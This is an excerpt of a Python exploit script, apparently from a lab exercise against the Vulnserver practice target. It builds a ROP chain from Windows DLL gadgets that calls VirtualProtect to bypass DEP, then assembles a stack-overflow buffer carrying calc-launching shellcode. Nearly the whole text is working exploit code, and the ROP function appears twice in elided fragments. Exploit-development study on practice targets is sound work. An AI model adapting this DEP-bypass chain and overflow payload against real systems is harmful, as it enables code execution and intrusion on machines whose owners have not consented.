...
def create_rop_chain():
    ...
    rop_gadgets = [
        ...
        0x90909090,  # Filler (RETN offset compensation)
        0x90909090,  # Filler (RETN offset compensation)
        0x90909090,  # Filler (RETN offset compensation)
...
def create_rop_chain():
    ...
    rop_gadgets = [
        # [---INFO:gadgets_to_set_esi:---]
        0x75305398,  # POP ECX # RETN [MSCTF.dll] ** REBASED ** ASLR
        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x752efd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ebp:---]
        0x755af376,  # POP EBP # RETN [kernel32.dll] ** REBASED ** ASLR
        0x625011af,  # & jmp esp [essfunc.dll]
        # [---INFO:gadgets_to_set_ebx:---]
        0x756a3d03,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x752d2fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR
        0x751f2996,  # XCHG EAX,EBX # RETN [user32.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_edx:---]
        0x755b25bd,  # POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x74de0b8a,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
        0x758a3d05,  # XCHG EAX,EDX # ADC ESP,EDI # DEC ECX # RETN 0x0C [GDI32.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_ecx:---]
        0x73164ea5,  # POP ECX # RETN [mswsock.dll] ** REBASED ** ASLR
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x74d30de2,  # &Writable location [SspiCli.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_edi:---]
        0x75640a31,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR
        0x74e1ad68,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
        # [---INFO:gadgets_to_set_eax:---]
        0x74df198b,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
        0x90909090,  # nop
        # [---INFO:pushad:---]
        0x7524b030,  # PUSHAD # RETN [user32.dll] ** REBASED ** ASLR
    ]
...
buffer = b"\x90"*2004 + rop_chain +b"\x90"*16 +shellcode_calc+b"C"*(5004-2004-len(rop_chain)-16- len(shellcode_calc))
#
